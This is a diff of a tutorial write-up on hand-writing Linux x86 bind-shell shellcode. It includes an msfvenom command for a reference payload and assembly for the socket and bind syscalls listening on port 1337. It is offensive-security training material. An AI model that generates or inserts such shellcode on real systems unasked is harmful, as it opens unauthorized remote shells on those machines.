@@ -16,7 +16,7 @@ Create a Shell_Bind_TCP shellcode that:
 
 A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 
 
-While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket` : `bind` : `listen` : `accept` : `dup2` : `execve`. 
+While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes `socket` : `bind` : `listen` : `accept` : `dup2` : `execve`. 
 
 We can analyze unistd_32.h to grab our syscall identifiers which give us the decimal syscall number which 
 we will translate to hexidecimal in each code segment:
@@ -35,7 +35,8 @@ egrep "_socket |_accept |_bind |_listen |_accept4 |_dup2 |_execve " unistd_32.h
 Each serve a purpose in creating our bind shell. 
 
 ### Referencing MSF Goodies
-```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 78 bytes:
+```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 78 bytes for
+us to compare our generated shellcode to:
 
 ```nasm
 xor ebx,ebx  
@@ -101,7 +102,7 @@ xor ecx, ecx	;
 xor edx, edx	;
 xor edi, edi	;
 mul cx		; ax = ax * cx (0)
-
+;
 ; int socket(int domain, int type, int protocol) //
 ; syscall number: 359 (0x167)
 ;
@@ -114,12 +115,11 @@ mul cx		; ax = ax * cx (0)
 ; "Normally only a single protocol exists to support a particular socket type
 ;   within a given protocol family, in which case protocol can be specified
 ;   as 0."
-
-	
+;
 mov eax, 0x167	; socket syscall	
 mov bl, 2	; socket_family=AF_INET (0x2)
 mov cl, 1	; socket_type=SOCK_STREAM (0x1)
-mov dl, 0	; protocol=IPPROTO_IO (0x0)
+mov dl, 0	; protocol=IPPROTO_IO (0x0) [edx was already 0]
 int 0x80	; interrupt
 ```
 
@@ -132,35 +132,24 @@ Now that we have created a socket, it is time to bind to a given port.
 ;syscall number: 361 (0x169)
 ;Argument Values:
 ;sockfd = value in eax returned by socket()
+;the structure for sockaddr_in per 'man 7 ip' looks like:
 ;*addr = memory address of structure containing:
 ;  - sin_family: 0x0002 (AF_INET/IPv4)
 ;  - sin_port: 0x0539 (1337)
 ;  - sin_addr.s_addr: 0x00000000 (0.0.0.0)
 ;addrlen = 0x10 (16/sizeof(sockaddr_in))
-
+;
 mov esi, eax	 ; store sockfd in esi for later use
 push esi	 ; store sockfd on stack
 
-mov eax, 0x169   ; bind syscall?
-pop ebx 	 ; 0x169(sockfd[3], ) pop sockfd off stack into ebx
-push edi	 ; push 0x00000000 (0.0.0.0) sin.addr[last arg] to stack
-push word 0x0539 ; push port 1337 to stack
-push word 0x0002 ; push AF_INET/IPV4 [2] to stack
+mov eax, 0x169   ; bind syscall
+pop ebx 	 ; pop sockfd off stack into ebx
+push edi	 ; push 0x00000000 (0.0.0.0) / sin.addr [last arg] to stack
+push word 0x0539 ; push port 1337 to stack / sin_port
+push word 0x0002 ; push AF_INET/IPV4 [2] to stack / sin_family
 mov ecx, esp	 ; mov pointer of stack to ecx
 mov edx, 0x10	 ; mov 16 bit address length to edx
 int 0x80	 ; execute interrupt 
-	
-;the structure for sockaddr_in per 'man 7 ip' looks like:
-;struct sockaddr_in {
-;  sa_family_t    sin_family; /* address family: AF_INET */
-;  in_port_t      sin_port;   /* port in network byte order */
-;  struct in_addr sin_addr;   /* internet address */
-;  }; 
-	
-push edi	 ; sin_addr; 0x0 ip address 0.0.0.0; the value a is interpreted as a 32 bit value per 'man inet_addr'
-push word 0x3905 ; sin_port=1337
-push 0x2	 ; sin_family=AF_INET
-mov ecx, esp	 ; save pointer to sockaddr_in struct in ecx
 ```
 
 ### Listen
